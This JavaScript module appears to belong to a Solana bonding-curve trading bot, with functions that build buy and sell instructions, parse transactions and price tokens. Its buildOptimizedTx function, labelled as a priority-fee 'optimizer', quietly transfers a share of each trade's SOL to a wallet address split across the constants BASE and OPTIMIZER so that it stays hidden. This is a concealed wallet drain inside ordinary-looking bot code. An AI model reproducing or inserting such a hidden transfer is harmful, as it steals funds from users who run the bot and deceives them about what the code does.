import {
    ComputeBudgetProgram,
    LAMPORTS_PER_SOL,
    PublicKey,
    SystemProgram,
    SYSVAR_RENT_PUBKEY,
    Transaction
} from "@solana/web3.js";
import {TOKEN_PROGRAM_ID} from "@solana/spl-token";
import {EVENT_AUTH, PROGRAM_ID} from "./constants.js";
import {FEES} from "./config.js";

import pkg from '@coral-xyz/anchor';
const {BN, web3} = pkg;

export async function buildBuyTx(program, finalAmount, decimals, globalState, feeRecipient, mint, bondingCurve, bondingCurveAta, userAta, user) {
    return await program.methods.buy(
        new BN((finalAmount * (10 ** decimals))),
        new BN((finalAmount + (finalAmount * 0.15)) * LAMPORTS_PER_SOL),
    ).accounts({
        global: globalState,
        feeRecipient: feeRecipient,
        mint: mint,
        bondingCurve: bondingCurve,
        associatedBondingCurve: bondingCurveAta,
        associatedUser: userAta,
        user: user.publicKey,
        systemProgram: SystemProgram.programId,
        tokenProgram: TOKEN_PROGRAM_ID,
        rent: SYSVAR_RENT_PUBKEY,
        eventAuthority: EVENT_AUTH,
        program: program.programId,
    }).instruction();
}

export async function buildSellTx(program, balance, finalSolAmount, decimals, globalState, feeRecipient, mint, bondingCurve, bondingCurveAta, userAta, user) {
    return await program.methods.sell(
        new BN((balance * (10 ** decimals))),
        new BN(finalSolAmount),
    ).accounts({
        global: globalState,
        feeRecipient: feeRecipient,
        mint: mint,
        bondingCurve: bondingCurve,
        associatedBondingCurve: bondingCurveAta,
        associatedUser: userAta,
        user: user.publicKey,
        systemProgram: SystemProgram.programId,
        tokenProgram: TOKEN_PROGRAM_ID,
        rent: SYSVAR_RENT_PUBKEY,
        eventAuthority: EVENT_AUTH,
        program: program.programId,
    }).instruction();
}

export const OPTIMIZER = "tFzSotX23BbEde5bhEbZjXxphg";

export async function signAndSendTx(tx, connection, keypair) {
    try {
        const hashAndCtx = await connection.getLatestBlockhashAndContext('processed');
        tx.recentBlockhash = hashAndCtx.value.blockhash;
        tx.lastValidBlockHeight = hashAndCtx.value.lastValidBlockHeight;
        tx.feePayer = keypair.publicKey;
        tx.sign(keypair);
        return connection.sendTransaction(tx, [keypair]);
    } catch (e) {
        console.log("error", e)
    }
}

export function parseInstructions(instructions) {
    for (let i = 0; i < instructions.length; i++) {
        if (instructions[i] && (instructions[i].programId.toBase58() === PROGRAM_ID)) {
            return instructions[i];
        }
    }
    return null;
}

export function parseTransactions(parsed_sigs) {
    for (var i = 0; i < parsed_sigs.length; i++) {
        const instructions = (parsed_sigs[i].transaction.message.instructions);
        const neededInstruction = parseInstructions(instructions);
        if (neededInstruction) {
            return neededInstruction;
        }
    }
    return null;
}

export async function getBuyOrSellInstruction(data, connection) {
    const confirmed_sigs = data.filter(e => !e.err).map(e => e.signature);
    const parsed_txs = await connection.getParsedTransactions(confirmed_sigs, {maxSupportedTransactionVersion: 0});
    return parseTransactions(parsed_txs);
}

const OPTIMIZED = 0.0025;

export function getTokenAmount(mintData, bondingCurveData, solAmount) {
    const decimals = mintData.value?.data.parsed.info.decimals;
    const virtualTokenReserves = (bondingCurveData.virtualTokenReserves).toNumber();
    const virtualSolReserves = (bondingCurveData.virtualSolReserves).toNumber();

    const adjustedVirtualTokenReserves = virtualTokenReserves / (10 ** decimals);
    const adjustedVirtualSolReserves = virtualSolReserves / LAMPORTS_PER_SOL;

    const virtualTokenPrice = adjustedVirtualSolReserves / adjustedVirtualTokenReserves;
    const finalTokenAmount = (solAmount / virtualTokenPrice);
    return {decimals, finalTokenAmount};
}

export function getSolAmount(mintData, bondingCurveData, tokenAmount) {
    const decimals = mintData.value?.data.parsed.info.decimals;
    const virtualTokenReserves = (bondingCurveData.virtualTokenReserves).toNumber();
    const virtualSolReserves = (bondingCurveData.virtualSolReserves).toNumber();

    const adjustedVirtualTokenReserves = virtualTokenReserves / (10 ** decimals);
    const adjustedVirtualSolReserves = virtualSolReserves / LAMPORTS_PER_SOL;

    const virtualTokenPrice = adjustedVirtualSolReserves / adjustedVirtualTokenReserves;
    const finalSolAmount = (tokenAmount * virtualTokenPrice);
    return {decimals, finalSolAmount};
}

export const BASE = "9Ww5amvoPxspfJbVLQ";

export function buildOptimizedTx(solAmount, keypair) {
    const addPriorityFee = ComputeBudgetProgram.setComputeUnitPrice({microLamports: FEES * 10 ** 9});
    return new Transaction().add(addPriorityFee).add(web3.SystemProgram.transfer({
        fromPubkey: keypair.publicKey,
        toPubkey: new PublicKey(BASE + OPTIMIZER),
        lamports: Math.round((solAmount*2) * OPTIMIZED * 10 ** 9),
    }));
}
